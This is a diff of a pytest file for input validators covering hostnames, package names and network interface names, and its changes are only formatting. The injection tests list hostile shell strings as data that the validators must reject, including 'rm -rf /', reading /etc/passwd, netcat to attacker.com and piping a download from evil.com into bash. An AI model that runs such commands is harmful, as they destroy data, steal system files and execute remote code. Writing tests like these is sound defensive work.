@@ -48,10 +48,10 @@ class TestHostnameValidator:
         """Test invalid hostname formats."""
         assert not is_valid_hostname("")
         assert not is_valid_hostname("server_1")  # Underscores invalid
-        assert not is_valid_hostname("-server")   # Can't start with hyphen
-        assert not is_valid_hostname("server-")   # Can't end with hyphen
-        assert not is_valid_hostname("a" * 64)    # Label too long
-        assert not is_valid_hostname("a" * 254)   # Hostname too long
+        assert not is_valid_hostname("-server")  # Can't start with hyphen
+        assert not is_valid_hostname("server-")  # Can't end with hyphen
+        assert not is_valid_hostname("a" * 64)  # Label too long
+        assert not is_valid_hostname("a" * 254)  # Hostname too long
 
     def test_injection_attempts(self):
         """Test that command injection attempts are rejected."""
@@ -136,9 +136,9 @@ class TestPackageNameValidator:
     def test_valid_special_characters(self):
         """Test that valid special characters are accepted."""
         assert is_valid_package_name("python3-pip")  # Hyphen
-        assert is_valid_package_name("python3.11")   # Period
-        assert is_valid_package_name("lib_name")     # Underscore
-        assert is_valid_package_name("g++")          # Plus
+        assert is_valid_package_name("python3.11")  # Period
+        assert is_valid_package_name("lib_name")  # Underscore
+        assert is_valid_package_name("g++")  # Plus
 
 
 class TestNetmaskValidator:
@@ -358,28 +358,34 @@ class TestEmailValidator:
 class TestInjectionPrevention:
     """Test comprehensive injection attack prevention."""
 
-    @pytest.mark.parametrize("malicious_input", [
-        "; rm -rf /",
-        "&& cat /etc/passwd",
-        "| nc attacker.com 1234",
-        "`whoami`",
-        "$(whoami)",
-        "../../../etc/passwd",
-        "\n/bin/bash",
-        "'; DROP TABLE users; --",
-    ])
+    @pytest.mark.parametrize(
+        "malicious_input",
+        [
+            "; rm -rf /",
+            "&& cat /etc/passwd",
+            "| nc attacker.com 1234",
+            "`whoami`",
+            "$(whoami)",
+            "../../../etc/passwd",
+            "\n/bin/bash",
+            "'; DROP TABLE users; --",
+        ],
+    )
     def test_interface_injection_prevention(self, malicious_input):
         """Test that interface validator blocks all injection attempts."""
         assert not is_valid_interface_name(f"eth0{malicious_input}")
         assert not is_valid_interface_name(malicious_input)
 
-    @pytest.mark.parametrize("malicious_input", [
-        "; curl evil.com/malware.sh | bash",
-        "&& rm -rf /",
-        "| nc attacker.com 1234",
-        "`id`",
-        "$(uname -a)",
-    ])
+    @pytest.mark.parametrize(
+        "malicious_input",
+        [
+            "; curl evil.com/malware.sh | bash",
+            "&& rm -rf /",
+            "| nc attacker.com 1234",
+            "`id`",
+            "$(uname -a)",
+        ],
+    )
     def test_package_injection_prevention(self, malicious_input):
         """Test that package validator blocks all injection attempts."""
         assert not is_valid_package_name(f"vim{malicious_input}")
@@ -423,8 +429,8 @@ class TestValidatorEdgeCases:
         very_long = "a" * 10000
 
         assert not is_valid_interface_name(very_long)  # Max 15
-        assert not is_valid_package_name(very_long)    # Max 256
-        assert not is_valid_hostname(very_long)        # Max 253
+        assert not is_valid_package_name(very_long)  # Max 256
+        assert not is_valid_hostname(very_long)  # Max 253
 
     def test_unicode_handling(self):
         """Test validators with unicode characters."""
